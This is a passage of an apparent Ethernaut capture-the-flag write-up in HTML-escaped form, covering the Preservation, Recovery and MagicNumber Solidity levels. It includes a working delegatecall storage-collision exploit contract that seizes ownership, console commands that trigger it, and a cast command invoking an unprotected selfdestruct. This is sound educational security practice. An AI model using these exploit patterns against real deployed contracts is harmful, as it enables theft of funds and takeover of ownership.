&lt;&#x2F;span&gt;&lt;span&gt;    timeZone1Library &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _timeZone1LibraryAddress; 
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone2Library &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _timeZone2LibraryAddress; 
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; set the time for timezone 1
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setFirstTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_timeStamp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone1Library.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(setTimeSignature, _timeStamp));
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; set the time for timezone 2
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setSecondTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_timeStamp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone2Library.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(setTimeSignature, _timeStamp));
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Simple library contract to set the time
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;LibraryContract &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; stores a timestamp 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; storedTime;  
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_time) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    storedTime &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _time;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;https:&#x2F;&#x2F;learnblockchain.cn&#x2F;article&#x2F;5372: &lt;code&gt;delegateCall&lt;&#x2F;code&gt; stating variables are actually modified not by their names, but by their declared location in storage.&lt;&#x2F;p&gt;
&lt;p&gt;That is mean when delegateCall LibraryContract, &lt;code&gt;storedTime&lt;&#x2F;code&gt; was pointed to the address of &lt;code&gt;timeZone1Library&lt;&#x2F;code&gt; in Preservation’s storage. Through that, we can change the timeZone1Library to our evil contract, and call &lt;code&gt;setFirstTime&lt;&#x2F;code&gt; again to trigger evil code.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; stores a timestamp 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; holder1;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; holder2;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_time) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    holder1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _time;
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&amp;gt; contract.setFirstTime(&amp;#39;0x12e47be67263aF5939fe689A549c3e2a9110417F&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;deployed exp contract address
&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; await web3.eth.getStorageAt(contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; &amp;#39;0x00000000000000000000000012e47be67263af5939fe689a549c3e2a9110417f&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; contract.setFirstTime(&amp;#39;0x12e47be67263aF5939fe689A549c3e2a9110417F&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;simply could be anything valid
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;recovery&quot;&gt;Recovery&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Recovery &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;generate tokens
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;generateToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;_name, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SimpleToken&lt;&#x2F;span&gt;&lt;span&gt;(_name, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;, _initialSupply);
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SimpleToken &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string public&lt;&#x2F;span&gt;&lt;span&gt; name;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; balances;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; constructor
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;_name, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_creator, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply) {
&lt;&#x2F;span&gt;&lt;span&gt;    name &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _name;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_creator] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _initialSupply;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; collect ether in return for tokens
&lt;&#x2F;span&gt;&lt;span&gt;  receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; allow transfers of tokens
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{ 
&lt;&#x2F;span&gt;&lt;span&gt;    require(balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; _amount;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _amount;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; clean up after ourselves
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;destroy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_to) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(_to);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Tracking the contract creation(Internal transcation) on etherscan would show the address of created token contract. Any note that &lt;code&gt;destroy&lt;&#x2F;code&gt; function was setted to be public, call this function could solve this challenge&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast send 0xe8b72c8696d6370bc1b0ba465477c3c3c650cde0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;destroy(address)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;1rpc.io&#x2F;sepolia&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span&gt;bytesKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Contract addresses are deterministic and are calculated by &lt;code&gt;keccak256(address, nonce)&lt;&#x2F;code&gt; where the &lt;code&gt;address&lt;&#x2F;code&gt; is the address of the contract (or ethereum address that created the transaction) and &lt;code&gt;nonce&lt;&#x2F;code&gt; is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).&lt;&#x2F;p&gt;
&lt;p&gt;Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.&lt;&#x2F;p&gt;
&lt;p&gt;An interesting &lt;a href=&quot;https:&#x2F;&#x2F;swende.se&#x2F;blog&#x2F;Ethereum_quirks_and_vulns.html&quot;&gt;blog post&lt;&#x2F;a&gt; by Martin Swende details potential use cases of this.&lt;&#x2F;p&gt;
&lt;p&gt;If you’re going to implement this technique, make sure you don’t miss the nonce, or your funds will be lost forever.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;seems not intended… but the blog interesting exactly.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;magicnumber&quot;&gt;MagicNumber&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MagicNum &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; solver;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setSolver&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_solver) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    solver &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _solver;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;  *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;To solve this level, you only need to provide the Ethernaut with a &lt;code&gt;Solver&lt;&#x2F;code&gt;, a contract that responds to &lt;code&gt;whatIsTheMeaningOfLife()&lt;&#x2F;code&gt; with the right number.&lt;&#x2F;p&gt;
&lt;p&gt;Easy right? Well… there’s a catch.&lt;&#x2F;p&gt;
&lt;p&gt;The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.&lt;&#x2F;p&gt;
&lt;p&gt;Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.&lt;&#x2F;p&gt;
&lt;p&gt;Good luck!&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;write valid opcodes to implement the contract like following: (I found it on the internet somewhere)&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;0x60 - PUSH1 –&amp;gt; PUSH(0x2a) –&amp;gt; 0x602a (Pushing 2a or 42)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;0x60 - PUSH1 –&amp;gt; PUSH(0x80) –&amp;gt; 0x6080 (Pushing an arbitrary selected memory slot 80)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;0x52 - MSTORE –&amp;gt; MSTORE –&amp;gt; 0x52 (Store value p=0x2a at position v=0x80 in memory)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;0x60 - PUSH1 –&amp;gt; PUSH(0x20) –&amp;gt; 0x6020 (Size of value is 32 bytes)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;0x60 - PUSH1 –&amp;gt; PUSH(0x80) –&amp;gt; 0x6080 (Value was stored in slot 0x80)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;0xf3 - RETURN –&amp;gt; RETURN –&amp;gt; 0xf3 (Return value at p=0x80 slot and of size s=0x20)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; deploy it and get contractAddress
&lt;&#x2F;span&gt;&lt;span&gt;await web3.eth.sendTransaction({ from:player, data: &amp;#39;0x69602a60005260206000f3600052600a6016f3&amp;#39; });
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; submit the solver contract
&lt;&#x2F;span&gt;&lt;span&gt;await contract.setSolver(&amp;#39;0x5ba95745bb7ae5ac15ab9968e665ab761ca7b62f&amp;#39;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;alien-codex&quot;&gt;Alien Codex&lt;&#x2F;h2&gt;
